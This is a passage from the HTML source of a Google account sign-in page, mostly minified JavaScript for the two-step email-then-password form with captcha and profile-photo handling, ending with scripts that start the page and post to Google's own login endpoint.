b!=PS_Wd(a))if(a.I=!1,b=encodeURIComponent(String(b)),PS_p){var e=PS_wc(a.u);e.open("text/html",c?"replace":void 0);c=PS_lc(PS_kc("title",{},d||a.a.document.title),PS_kc("body",{},b));e.write(PS_H(c));e.close()}else if(PS_Fa(a.s,PS_F,"this.iframeSrc_ must be set on calls to setIframeToken_"),e=PS_dc(a.s)+"#"+b,a=a.u.contentWindow)c?a.location.replace(e):a.location.href=e},PS_Wd=function(a){if(PS_p)return a=PS_wc(a.u),a.body?PS_ma(a.body.innerHTML):null;var b=a.u.contentWindow;if(b){var c;try{c=PS_ma(PS_Ud(b))}catch(d){return a.l||
(1!=a.l&&PS_Nb(a.f,1E4),a.l=!0),null}a.l&&(0!=a.l&&PS_Nb(a.f,150),a.l=!1);return c||null}return null};PS_4.prototype.w=function(){if(this.h){var a=PS_Ud(this.a);a!=this.i&&PS_Vd(this,a)}if(!this.h||PS_1)if(a=PS_Wd(this)||"",null==this.j||a==this.j)this.j=null,a!=this.i&&PS_Vd(this,a)};var PS_Vd=function(a,b){a.i=a.o.value=b;a.h?(PS_1&&PS_3(a,b),PS_Qd(a,b)):PS_3(a,b);PS_y(a,new PS_Od(PS_2(a)))};PS_4.prototype.U=function(){PS_Lb(this.f);PS_Mb(this.f)};
var PS_Td=["mousedown","keydown","mousemove"],PS_Pd=0;var PS_Yd=function(a,b){PS_l.call(this);this.b=a;this.f=null;this.a=new PS_4;PS_m(this,this.a);PS_Sd(this.a,!0);PS_Xd(this.a,a,!0);this.h=b||PS_ba;var c=new PS_Q(this);PS_m(this,c);PS_R(c,this.a,"navigate",this.g)};PS_i(PS_Yd,PS_l);var PS_Zd={Da:"identifier",Ea:"password"},PS_5=function(a){return"identifier"==a.b};PS_Yd.prototype.g=function(a){var b=PS_2(this.a),c;a:{for(c in PS_Zd)if(PS_Zd[c]==b){c=!0;break a}c=!1}c&&b!=this.b?(this.f=this.b,this.b=b,this.h(a)):PS_Xd(this.a,this.b,!1)};var PS__d=function(a){PS_l.call(this);this.m=a;this.j=PS_K("Email");this.o=PS_K("Passwd");this.a=PS_K("Email-hidden");this.g=this.a.value;this.b=PS_K("Passwd-hidden");this.h=PS_K("identifier-shown");this.v=PS_Da(PS_uc(this.h),"No children found under the element with id: identifier-shown");this.i=PS_K("password-shown");this.w=PS_Da(PS_uc(this.i),"No children found under the element with id: password-shown");this.l="";this.f=new PS_Q(this);PS_m(this,this.f);PS_sc(PS_5(this.m)?this.i:this.h);PS_rc(this.a,
{name:"Email"});PS_R(this.f,this.j,"input",this.s);PS_R(this.f,this.a,"change",this.F)};PS_i(PS__d,PS_l);PS__d.prototype.s=function(){this.b.value&&(PS_Ec(this.f,this.j,"input",this.s),this.l=this.b.value)};PS__d.prototype.F=function(){this.a.value=this.g};var PS_7=function(a,b,c){PS_l.call(this);this.b=new PS_Yd(1==a?"password":"identifier",PS_g(this.qa,this));PS_m(this,this.b);this.ta=PS_M("main-content");this.m=PS_K("gaia_loginform");this.l=PS_M("slide-out");this.h=PS_M("slide-in");this.a=PS_K("Email");this.i=PS_K("Passwd");this.o=PS_K("next");this.ia=PS_K("signIn");this.u=PS_K("back-arrow");this.s=PS_M("circle-mask");this.Aa=PS_K("email-display");this.ga=PS_K("profile-name");this.Ba=PS_K("link-forgot-passwd");this.N=null;this.A=PS_K("canvas");this.T=
PS_K("identifier-captcha");this.Y=PS_K("captcha-box");this.v=PS_K("captcha-img");this.U=PS_K("identifier-token");this.j=PS_K("identifier-captcha-input");this.g=null;this.za=PS_K("profile-information");this.ja=PS_M("signin-card");this.w=PS_M("card-mask-wrap");this.F=PS_oc(document,"dasher-tooltip");this.I=new PS_A(this.ra,75,this);PS_m(this,this.I);this.L=this.M=!1;this.G=0;this.f=new PS_Q(this);PS_m(this,this.f);PS_R(this.f,this.m,"submit",this.Z);PS_Ha(["transitionend","webkitTransitionEnd","otransitionend",
"mozTransitionEnd"],function(a){PS_R(this.f,this.l,a,this.va);PS_R(this.f,this.h,a,this.xa)},this);PS_Hc(this.u,this.ua,this,this.f);this.m.action=b;this.W=new PS__d(this.b);PS_m(this,this.W);0==a?PS_6(this.a):(PS_6(this.i),PS_Sb(this.u,"shift-form"));c&&!this.o.disabled&&this.Z()};PS_i(PS_7,PS_l);var PS_0d=["gaia","pages","PasswordSeparationPage"],PS_8=PS_a;PS_0d[0]in PS_8||!PS_8.execScript||PS_8.execScript("var "+PS_0d[0]);
for(var PS_1d;PS_0d.length&&(PS_1d=PS_0d.shift());)!PS_0d.length&&PS_b(PS_7)?PS_8[PS_1d]=PS_7:PS_8[PS_1d]?PS_8=PS_8[PS_1d]:PS_8=PS_8[PS_1d]={};var PS_2d={"-moz-transform":!0,"-ms-transform":!0,"-o-transform":!0,"-webkit-transform":!0,transform:!0};PS_7.prototype.Z=function(a){PS_5(this.b)?(a&&a.preventDefault instanceof Function&&a.preventDefault(),PS_P(this.o,!0),PS_P(this.a,!0),PS_3d(this)):(PS_P(this.ia,!0),PS_P(this.o,!0),this.i.setAttribute("readonly",""))};
PS_7.prototype.ua=function(a){a.preventDefault();PS_Xd(this.b.a,"identifier",!1)};
var PS_3d=function(a){if(!a.M){a.M=!0;var b={};b.Email=a.a.value;b.requestlocation=PS_a.location.href;a.L&&(b["identifier-captcha-input"]=a.j.value,b.identifiertoken=a.U.value);var c="js_disabled";try{document.bg.invoke(function(a){c=a})}catch(f){c=""}b.bgresponse=c;PS_4d(a,b);var d=[],e;for(e in b)d.push(e+"="+encodeURIComponent(b[e]));PS_sb(PS_9c(PS_g(a.wa,a),d.join("&")),"timeout",function(){PS_9(this);PS_5d(this,"timeoutError")},!1,a)}},PS_4d=function(a,b){for(var c=PS_L("INPUT","",a.m),d=0,e;e=
c[d];d++)"hidden"==e.type&&e.value&&!b[e.name]&&(b[e.name]=e.value)},PS_7d=function(a,b){PS_6d(a);a.ma=b.name;a.Ca=b.email;a.ha=b.photo_url;a.oa=b.recovery_url;if(b.shadow_email){a.W.u=b.shadow_email;var c=document.createElement("INPUT");c.setAttribute("type","hidden");c.setAttribute("name","ignoreShadow");c.setAttribute("value","1");a.m.appendChild(c)}a.za.value=b.encoded_profile_information;PS_Xd(a.b.a,"password",!1)};
PS_7.prototype.wa=function(a){this.M=!1;var b=PS_gd(a.target);if(200==b){var c;a=a.target;try{c=a.a?a.a.responseText:""}catch(d){PS_S(a.C,"Can not get responseText: "+d.message),c=""}c=PS_Ic(c);"SHOW_ERROR"==c.action?(PS_9(this),PS_5d(this,c.error_msg)):"REDIRECT"==c.action?(a=c.redirectUrl,c=PS_a.location,a=a instanceof PS_E?a:PS_bc(a),c.href=PS_9b(a)):"SHOW_CAPTCHA"==c.action?(PS_9(this),PS_8d(this,c),PS_9d(this)):"SHOW_CAPTCHA_AND_ERROR"==c.action?(PS_9(this),PS_8d(this,c),PS_5d(this,c.error_msg)):
(PS_9(this),PS_7d(this,c))}else 0<b&&(PS_9(this),PS_7d(this,{name:"",email:this.a.value,photo_url:"",recovery_url:"https://accounts.google.com/RecoverAccount?Email="+this.a.value,encoded_profile_information:""}))};var PS_9=function(a){PS_P(a.o,!1);PS_P(a.a,!1)};
PS_7.prototype.qa=function(){PS_Pb(this.I);var a=this.W;PS_5(a.m)?(PS_sc(a.i),a.g=a.a.value="",a.o.value="",a.h.appendChild(a.v),a.l=a.b.value):(a.u?a.g=a.a.value=a.u:a.g=a.a.value=a.j.value,a.l!==a.b.value&&(a.o.value=a.b.value),PS_sc(a.h),a.i.appendChild(a.w));if(PS_5(this.b)){if(PS_B(this.l,"hide-form",!1),PS_$d(this),PS_ae(this,100,0),PS_$(this,"shift-form",!1),PS_Tb(this.u,"shift-form"),"password"==this.b.f&&(PS_nd(this.s,"0.01"),a=this.I,PS_Pb(a),a.a=PS_Ob(a.g,PS_b(void 0)?void 0:a.h),PS_6d(this),
PS_9d(this),PS_P(this.ia,!1),PS_P(this.o,!1),this.i.removeAttribute("readonly"),a=this.m.ignoreShadow))if(PS_ca(a))for(var b=a.length,c=0;c<b;c++)a[c].value="0";else a.value="0"}else this.F&&PS_X(this.F,!1),PS_B(this.h,"hide-form",!1),PS_$d(this),PS_ae(this,0,100),PS_$(this,"shift-form",!0),PS_be(this)};
var PS_be=function(a){var b="https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=96";a.ha&&(b=a.ha+"?sz="+String(a.A.width));PS_Ib(new PS_w(function(){this.N=document.createElement("IMG");this.N.src=b;this.A.getContext("2d").clearRect(0,0,this.A.width,this.A.height);this.ma?(PS_xc(this.ga,this.ma),PS_X(this.ga,!0),PS_$(this,"no-name",!1)):(PS_X(this.ga,!1),PS_$(this,"no-name",!0));PS_xc(this.Aa,this.Ca||"");this.oa&&(this.Ba.href=this.oa)},window,a))},PS_$=
function(a,b,c){PS_B(a.ja,b,c);PS_ce(a,b,c)},PS_ce=function(a,b,c){PS_B(a.w,b,c);PS_B(a.ta,b,c)},PS_ae=function(a,b,c){PS_W(a.l,"transitionDelay",b+"ms");PS_W(a.h,"transitionDelay",c+"ms")},PS_$d=function(a){a.ja.offsetWidth},PS_5d=function(a,b){PS_6(a.a);var c=PS_K("errormsg_0_Email"),d;if("INGE"==b){d=PS_K("inge").cloneNode(!0);var e=PS_uc(d),f;f=new PS_vd(e.href);var g=new PS_Z(f.g);g.set("EmailAddress",PS_ua(a.a.value));f=PS_zd(f,PS_Y(g.toString())).toString();e.href=f}else"timeoutError"==b&&
(d=PS_K("timeoutError").cloneNode(!0));d?((e=c.parentNode)&&e.replaceChild(d,c),PS_rc(d,{id:"errormsg_0_Email"}),PS_X(d,!0)):PS_xc(c,b+" ");c=a.G;d=PS_K("errormsg_0_Email");e=d.cloneNode(!0);PS_Tb(e,"error-msg");a:{if(PS_nc&&!(PS_p&&PS_s("9")&&!PS_s("10")&&PS_a.SVGElement&&d instanceof PS_a.SVGElement)&&(f=d.parentElement))break a;f=d.parentNode;f=PS_da(f)&&1==f.nodeType?f:null}f.appendChild(e);if("none"!=PS_ld(e,"display"))f=PS_md(e);else{f=e.style;var g=f.display,h=f.visibility,k=f.position;f.visibility=
"hidden";f.position="absolute";f.display="inline";var m=PS_md(e);f.display=g;f.position=k;f.visibility=h;f=m}f=f.height;PS_tc(e);PS_p?(e=PS_od(d,"marginLeft"),g=PS_od(d,"marginRight"),h=PS_od(d,"marginTop"),d=PS_od(d,"marginBottom"),d=new PS_V(h,g,d,e)):(e=PS_kd(d,"marginLeft"),g=PS_kd(d,"marginRight"),h=PS_kd(d,"marginTop"),d=PS_kd(d,"marginBottom"),d=new PS_V(parseFloat(h),parseFloat(g),parseFloat(d),parseFloat(e)));f+=d.top+d.bottom;a.G=f;d=a.w;b:{e=PS_xa("transform");if(void 0===d.style[e]&&(e=
PS_hd()+PS_ya(e),void 0!==d.style[e])){e=(PS_r?"-webkit":PS_q?"-moz":PS_p?"-ms":PS_o?"-o":null)+"-transform";break b}e="transform"}d=(d=PS_ld(d,e)||PS_ld(d,"transform"))?(d=d.match(PS_pd))?new PS_J(parseFloat(d[1]),parseFloat(d[2])):new PS_J(0,0):new PS_J(0,0);d=d.y+(a.G-c);0>d&&(c=a.w,PS_sd()&&(d=PS_td()?"translate3d(0px,"+d+"px,0px)":"translate(0px,"+d+"px)",PS_W(c,PS_ud(),d)));PS_$(a,"has-error",!0);PS_Sb(a.a,"form-error")},PS_9d=function(a){a.G=0;PS_W(a.w,"transform","");PS_xc(PS_K("errormsg_0_Email"),
"");PS_tc(PS_oc(document,"errormsg_0_Passwd"));PS_$(a,"has-error",!1);PS_Tb(a.a,"form-error");PS_Tb(a.i,"form-error")};PS_7.prototype.ra=function(){PS_W(this.s,"background-image","");PS_nd(this.s,"")};
PS_7.prototype.ka=function(){var a=this.A.width/2-this.N.width/2,b=this.A.height/2-this.N.height/2,c=this.A.getContext("2d"),d=0,e=this.A.width/2,f=this.A.height/2,g=document.createElement("canvas");g.width=this.A.width;g.height=this.A.height;var h=g.getContext("2d"),k=this.A.width/12,m=PS_g(function(){c.save();window.chrome?(h.clearRect(0,0,g.width,g.height),h.globalCompositeOperation="source-over",h.drawImage(this.N,a,b),h.shadowColor="#fff",h.globalCompositeOperation="destination-in",h.beginPath(),
h.arc(e,f,d,0,2*Math.PI,!1),h.closePath(),h.fill(),c.drawImage(g,0,0)):c.drawImage(this.N,a,b);c.restore()},this),l=PS_g(function(){var a=new PS_w(l);d+=k;if(d<=this.A.width){var b=d;c.save();window.chrome||(c.beginPath(),c.arc(e,f,b,0,2*Math.PI,!1),c.clip());m();c.restore();PS_Ib(a)}else PS_Fb(a),PS_5(this.b)||PS_W(this.s,"background-image","none")},this);l()};
var PS_8d=function(a,b){PS_ce(a,"has-captcha",!0);a.L=!0;var c=b.img_url,d=PS_L("IMG","",a.v)[0];d?d.setAttribute("src",c):(d=document.createElement("IMG"),d.setAttribute("src",c),d.setAttribute("alt",PS_0b(a.v)),a.v.appendChild(d));b.audio_url&&(c=b.audio_url,a.g=PS_L("A","",a.Y)[0],a.g?PS_Ec(a.f,a.g,"click"):(a.g=document.createElement("A"),PS_L("SPAN","",a.Y)[0].appendChild(a.g)),PS_R(a.f,a.g,"click",PS_ia(a.ya,c)),d=PS_L("IMG","",a.g)[0],d||(d=document.createElement("IMG"),d.setAttribute("src",
"accessibility.gif"),PS_Sb(d,"accessibility-logo"),a.g.appendChild(d)),d.setAttribute("alt",c));a.U.setAttribute("value",PS_ua(b.captcha_token));a.j.value="";PS_X(a.T,!0)};
PS_7.prototype.ya=function(a){var b=document.createElement("AUDIO");b.canPlayType&&b.canPlayType("audio/x-wav")?b.setAttribute("autoplay","autoplay"):(b=document.createElement("EMBED"),b.setAttribute("hidden","true"),b.setAttribute("autostart","true"));b.setAttribute("src",a);PS_K("playIdentifierAudio").innerHTML=PS_H(b);this.j.value="";PS_6(this.j)};
var PS_6d=function(a){PS_ce(a,"has-captcha",!1);PS_tc(PS_pc("captcha-container",a.h));a.L=!1;PS_sc(a.v);a.j.value="";PS_X(a.T,!1)},PS_6=function(a){!a||"function"!=typeof a.focus||PS_Za()||PS_("iPad")||PS_("iPod")||PS_("Trident")||PS_("MSIE")||a.focus()};PS_7.prototype.va=function(a){a.target==this.l&&PS_2d[a.R.propertyName]&&(PS_5(this.b)?(this.F&&PS_X(this.F,!0),PS_6(this.a)):(PS_9d(this),PS_Sb(this.u,"shift-form"),PS_B(this.l,"hide-form",!0),PS_$d(this),PS_$d(this)))};
PS_7.prototype.xa=function(a){a.target==this.h&&PS_2d[a.R.propertyName]&&(PS_5(this.b)?(PS_B(this.h,"hide-form",!0),PS_$d(this)):(this.N.complete?this.ka.call(this):PS_Dc(this.f,this.N,"load",this.ka,void 0),PS_6(this.i)))};
</script>

-->
  <script>
  passwordSeparationPage = new gaia.pages.PasswordSeparationPage(
  0
  , 'https://accounts.google.com/ServiceLoginAuth', gaia.ps.hasPrefilledIdentifier);
  </script>
<script>
  (function(){
  gaia_onLoginSubmit = function() {
  try {
  gaia.loginAutoRedirect.stop();
  } catch (err) {
  // do not prevent form from being submitted
  }
  try {
  document.bg.invoke(function(response) {
  document.getElementById('bgresponse').value = response;
  });
  } catch (err) {
  document.getElementById('bgresponse').value = '';
  }
  return true;
  }
  document.getElementById('gaia_loginform').onsubmit = gaia_onLoginSubmit;
  var signinButton;
  signinButton = document.getElementById('next');
 
  gaia_attachEvent(window, 'load', function(){
  gaia_scrollToElement(signinButton);
  });
  })();
</script>
  </body>
</html>
